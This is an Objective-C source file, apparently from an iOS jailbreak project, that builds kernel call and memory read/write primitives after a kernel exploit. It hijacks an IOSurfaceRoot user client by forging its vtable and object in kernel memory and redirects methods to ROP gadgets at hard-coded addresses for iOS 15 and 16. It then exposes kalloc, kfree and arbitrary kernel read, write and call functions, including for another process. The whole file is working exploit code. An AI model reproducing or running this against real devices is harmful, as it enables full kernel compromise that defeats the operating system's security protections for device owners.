//
//  kcall.m
//  escape
//
//  Created by Xiao on 2023/11/15.
//

#import <Foundation/Foundation.h>
#import "IOKit/IOKitLib.h"
#import "ipc.h"
#import "kpf.h"
#import "krw.h"
#import "libkfd.h"
#import "objcLogger.h"
#import "offsets.h"
#import "kcall.h"

static uint64_t fake_vtable = 0;
static uint64_t fake_client = 0;
static io_connect_t user_client = 0;

BOOL setup_client(struct kfd *kfd) {
    LOG(@"[*] setup kcall");
    find_offset(kfd);

    io_service_t service = IOServiceGetMatchingService(
        kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

    if (service == IO_OBJECT_NULL) {
        LOG(@"[-] Failed to get IOSurfaceRoot service");
        return NO;
    }

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        LOG(@"[-] Failed to open IOSurfaceRoot service");
        return NO;
    }
    user_client = conn;
    IOObjectRelease(service);
    
    uint64_t userclient_port = port_name_to_ipc_port(conn);
    uint64_t userclient_addr = kread64(userclient_port + off_ipc_port_ip_kobject);
    uint64_t userclient_vtab = kread64(userclient_addr);

    if (fake_vtable == 0)
        fake_vtable = off_empty_kdata_page + kfd->info.kernel.kernel_slide;
    LOG_FMT(@"[*] fake_vtable: %p", fake_vtable);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64(userclient_vtab + i * 8);
        kwrite64(fake_vtable + i * 8, data);
    }

    if (fake_client == 0)
        fake_client = off_empty_kdata_page + kfd->info.kernel.kernel_slide+0x1000;
    LOG_FMT(@"[*] fake_client: %p", fake_client);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64(userclient_addr + i * 8);
        kwrite64(fake_client + i * 8, data);
    }
    kwrite64(fake_client, fake_vtable);
    kwrite64(userclient_port + off_ipc_port_ip_kobject, fake_client);
    kwrite64(fake_vtable + 8 * 0xB8, off_add_x0_x0_0x40_ret);
    
    if (kfd->info.env.vid <= 1) {
        // patch iOS 16
        kwrite64(fake_vtable + 8 * 0xB9, off_getiotrap);
    }
    
    return YES;
}

void setup_remote_client(io_connect_t conn, pid_t pid, uint64_t *vtb, uint64_t *cli) {
    uint64_t userclient_port = port_name_to_ipc_port_for_pid((mach_port_t)conn, pid);
    uint64_t userclient_addr = kread64_2(userclient_port + off_ipc_port_ip_kobject);
    uint64_t userclient_vtab = kread64_2(userclient_addr);
    
    uint64_t fakevtb = kmalloc_2(0x1000);
    uint64_t fakecli = kmalloc_2(0x1000);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64_2(userclient_vtab + i * 8);
        kwrite64_2(fakevtb + i * 8, data);
    }
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64_2(userclient_addr + i * 8);
        kwrite64_2(fakecli + i * 8, data);
    }
    kwrite64_2(fakecli, fakevtb);
    kwrite64_2(userclient_port + off_ipc_port_ip_kobject, fakecli);
    NSLog(@"[*] write off_add_x0_x0_0x40_ret 0x%llx", off_add_x0_x0_0x40_ret);
    kwrite64_2(fakevtb + 8 * 0xB8, off_add_x0_x0_0x40_ret);
    if (@available(iOS 16, *)) {
        // patch iOS 16
        kwrite64_2(fakevtb + 8 * 0xB9, off_getiotrap);
    }
    *vtb = fakevtb;
    *cli = fakecli;
}

uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
    for (int i = 0; i < size; i += 8) {
        kwrite64(addr + i, 0);
    }
    return 0;
}

uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64(fake_client + 0x40);
    uint64_t offx28 = kread64(fake_client + 0x48);
    kwrite64(fake_client + 0x40, x0);
    kwrite64(fake_client + 0x48, addr);
    
    uint64_t kcall_ret = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64(fake_client + 0x40, offx20);
    kwrite64(fake_client + 0x48, offx28);
    return kcall_ret;
}

uint64_t kalloc(size_t ksize) {
    // kalloc using OSArray::initWithCapacity(ptr, capacity)
    // or OSOrderedSet::initWithCapacity(ptr, capacity), OSDictionary::initWithCapacity(ptr, capacity)
    // buffer pointer will be stored at ptr+0x20
    uint64_t r = kcall(off_container_init,
        off_empty_kdata_page != 0 ?
        off_empty_kdata_page + get_kernel_slide() + 0x500 :
        fake_client + 0x200, ksize / 8, 0, 0, 0, 0, 0);
    if (r == 0) return 0;
    uint64_t kmem = kread64(off_empty_kdata_page != 0 ?
                            off_empty_kdata_page + get_kernel_slide() + 0x500 + 0x20 :
                            fake_client + 0x200 + 0x20);
    return kmem;
}

void kfree(uint64_t kaddr, size_t ksize) {
    kcall(off_kfree_data_external + get_kernel_slide(), kaddr, ksize, 0, 0, 0, 0, 0);
}

BOOL kcall_init(struct kfd *kfd) {
    
    // setup user client, dirty kalloc now
    if (!setup_client(kfd)) {
        LOG(@"[-] setup_client failed");
        return NO;
    }
    
    usleep(5000);
    uint64_t kmem = kalloc(0x2000);
    if (!kmem) {
        LOG(@"[-] failed to kalloc");
        return NO;
    }
    LOG_FMT(@"[*] kalloc: %p", kmem);
    
    usleep(5000);
    uint64_t r = IOServiceClose(user_client);

    // update fake_client, fake_vtable and off_empty_kdata_page
    uint64_t cleanup_addr = off_empty_kdata_page + get_kernel_slide();
    off_empty_kdata_page = 0;
    fake_client = kmem;
    fake_vtable = kmem+0x1000;

    // clean up kalloc
    usleep(5000);
    clean_dirty_kalloc(cleanup_addr, 0x2000);
    
    usleep(5000);
    if (!setup_client(kfd)) {
        LOG(@"[-] setup_client failed");
        return NO;
    }
    usleep(50000);
    install_kernel_primitive(fake_client, fake_vtable);
    
    LOG(@"[*] test new primitive");
    uint32_t magicv = (kread32_2(kfd->info.kernel.kernel_slide + 0xfffffff007004000));
    if (magicv != 0xfeedfacf) {
        LOG(@"[-] failed to build new primitive");
    }
    kwrite64_2(kmem + 0x900, 0x00c0ffee00c0ffee);
    magicv = (kread32_2(kmem + 0x900));
    if (magicv != 0x00c0ffee) {
        LOG(@"[-] failed to build new primitive");
    }
    uint64_t magicv2 = kmalloc_2(0x100);
    printf("[DEBUG] kmem=0x%llx\n", magicv2);
    
    return YES;
}

uint64_t kcall2(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5) {
    
    if (@available(iOS 16, *)) {
        // mov x0, x3
        // br x4
        x4 = addr;
        x3 = x0;
        return IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, 0);
    }
    
    uint64_t x6 = addr; // BR X6
    // x0 -> x1
    // x1 -> x2
    // x2 -> x3
    // x3 -> x4
    // x4 -> x5
    // IOConnectTrap6(port, 0, x1, x2, x3, x4, x5, x6)
    return IOConnectTrap6(user_client, 0, x0, x1, x2, x3, x4, x6);
}

uint32_t kread32_2(uint64_t addr) {
    
    if (@available(iOS 16, *)) {
        return (uint32_t)kcall2(kread_gadget, addr, 0, 0, 0, 0, 0);
    }
    
    return (uint32_t)kcall2(0xFFFFFFF009446D08 + get_kernel_slide(), 0, addr, 0, 0, 0, 0);
}

uint8_t kread8_2(uint64_t addr) {
    return kread32_2(addr) & 0xff;
}

uint64_t kread64_2(uint64_t addr) {
    uint64_t ret = 0;
    ret |= kread32_2(addr);
    ret |= ((uint64_t)(kread32_2(addr + 0x4)) << 32);
    return ret;
}

uint64_t kmalloc_2(size_t ksize) {
    uint64_t r = kcall2(off_container_init, fake_client + 0x200, ksize / 8, 0, 0, 0, 0);
    if (r == 0) return 0;
    uint32_t low32 = kread32_2(fake_client + 0x200 + 0x20);
    uint32_t high32 = kread32_2(fake_client + 0x200 + 0x20 + 0x4);
    
    return (((uint64_t)high32) << 32) | low32;
}

void kwrite64_2(uint64_t addr, uint64_t data) {
    
    if (@available(iOS 16, *)) {
        kcall2(kwrite_gadget, addr, data, 0, 0, 0, 0);
        return;
    }
    
    kcall2(0xFFFFFFF007BADBB8 + get_kernel_slide(), addr, data, addr, 0, 0, 0);
}

void kwrite32_2(uint64_t addr, uint64_t data) {
    uint32_t high32 = kread32_2(addr + 0x4);
    data |= ((uint64_t)high32 << 32);
    kwrite64_2(addr, data);
}

void kwrite8_2(uint64_t addr, uint8_t data) {
    uint64_t d = kread64_2(addr);
    d &= 0xffffffffffffff00;
    d |= data;
    kwrite64_2(addr, d);
}

void install_kernel_primitive(uint64_t cli, uint64_t vtb) {
    // 1. receive a port name from jailbreakd
    // 2. overwrite it with add x0, x0, 0x40; ret; gadget
    // 3. overwrite the function pointer to jmp/branch register(x0 to x6) instruction

    // there are many gadgets like this for example:
    // 0xfffffff008777ae4 : nop ; mov x0, x2 ; movz x5, #0 ; br x6
    // 0xfffffff008777a90 : nop ; mov x0, x2 ; movz x4, #0 ; movz x5, #0 ; br x6
    // 0xfffffff008273358 : mov x0, x1 ; mov x1, x2 ; mov x2, x3 ; mov x3, x4 ; mov x4, x5 ; br x6

    // 0xFFFFFFF008273358: MOV X0, X1
    //                     MOV X1, X2
    //                     MOV X2, X3
    //                     MOV X3, X4
    //                     MOV X4, X5
    //                     BR  X6
    // 0xFFFFFFF009446D08: LDR X0, [X1]; RET
    // 0xFFFFFFF007BADBB8: STR X1, [X2]; RET

    // do kcall:
    // fake_client + 0x48 = 0xFFFFFFF008BAE908
    // x3 = 0xFFFFFFF009446D08 => read value from [x1]
    // x3 = 0xFFFFFFF007BADBB8 => write value to [x2]
    // x3 = whatever           => kcall x3 (we'd better call function with less than 3 parameters, can not control x0)
    
    // in iOS 16
    // well I am not sure whether these gadgets are existed in all iOS 16 versions
    // I just list them here
    // the following gadgets are from iOS 16.5, 20F66, iPhone X
    // 0xfffffff0075fb2e8 : mov x0, x3 ; br x4
    // 0xfffffff0072136cc : ldr x0, [x0] ; ret
    // 0xfffffff007213788 : str x1, [x0] ; ret
    
    if (@available(iOS 16, *)) {
        kwrite64(cli + 0x48, kcall_gadget);
        kwrite64(cli + 0x40, 0x41414141);
        return;
    }
    
    kwrite64(cli + 0x48, 0xFFFFFFF008273358 + get_kernel_slide());
    kwrite64(cli + 0x40, 0x41414141);
}
